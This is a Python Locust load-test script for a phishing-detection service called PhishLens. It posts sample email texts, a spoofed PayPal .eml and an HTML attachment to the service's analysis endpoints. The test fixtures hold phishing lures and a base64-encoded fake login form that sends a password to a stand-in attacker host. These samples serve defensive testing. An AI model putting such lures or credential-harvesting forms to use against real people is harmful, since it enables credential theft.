"""
PhishLens load test (Locust).

Simulates the traffic the extension actually generates: mostly /analyse
calls on plain-text Gmail bodies, some full .eml scans, a few attachment
scans, and the periodic /health warm-up ping. /explain is left out on
purpose: LIME runs ~100 forward passes, so it measures LIME rather than
the service.

Usage (see docs/operations.md for the full procedure):

    pip install locust
    # rate limits are per client IP, so raise them for the test run:
    #   RATE_LIMIT_ANALYSE=100000/minute RATE_LIMIT_ATTACHMENT=100000/minute
    locust -f scripts/locustfile.py --host http://127.0.0.1:8000 \
           --headless -u 10 -r 2 -t 2m --csv loadtest

Never point this at the public demo: it would burn the shared Google
Safe Browsing quota and throttle real users.
"""
from __future__ import annotations

import base64
import random

from locust import HttpUser, between, task

BENIGN = [
    "Hi team, the sprint review moved to Thursday 3pm. Agenda in the doc.",
    "Your order has shipped and should arrive within 3 to 5 business days.",
    "Reminder: the library closes early on Friday for maintenance.",
]
PHISHY = [
    "Your account has been suspended. Verify your identity within 24 hours "
    "at http://secure-login-update.tk/verify or it will be closed.",
    "Congratulations! You won a prize. Claim it now: http://192.168.4.20/claim",
]

EML = (
    b"From: PayPal Security <alert@paypa1-support.xyz>\r\n"
    b"Reply-To: collector@evil.example\r\n"
    b"Subject: Verify your account\r\n"
    b"Content-Type: text/plain\r\n\r\n"
    b"Click http://paypa1-support.xyz/login to avoid suspension.\r\n"
)
EML_B64 = base64.b64encode(EML).decode()

LOGIN_PAGE_B64 = base64.b64encode(
    b"<html><body><form action='http://attacker.tld/login'>"
    b"<input type='password' name='p'></form></body></html>"
).decode()


class ExtensionUser(HttpUser):
    # A Gmail user opens a message every few seconds at most.
    wait_time = between(1, 4)

    @task(10)
    def analyse_text(self):
        body = random.choice(BENIGN + PHISHY)
        self.client.post("/analyse", name="/analyse [text]", json={
            "raw_text": body,
            "sender_email": "someone@example.com",
            "client_context": {"origin": "gmail", "gmail_in_inbox": True},
        })

    @task(3)
    def analyse_eml(self):
        self.client.post("/analyse", name="/analyse [eml]",
                         json={"raw_email_b64": EML_B64})

    @task(1)
    def analyse_attachment(self):
        self.client.post("/analyse_attachment", json={
            "content_b64": LOGIN_PAGE_B64,
            "filename": "invoice.html",
            "mime_type": "text/html",
        })

    @task(2)
    def health(self):
        self.client.get("/health")
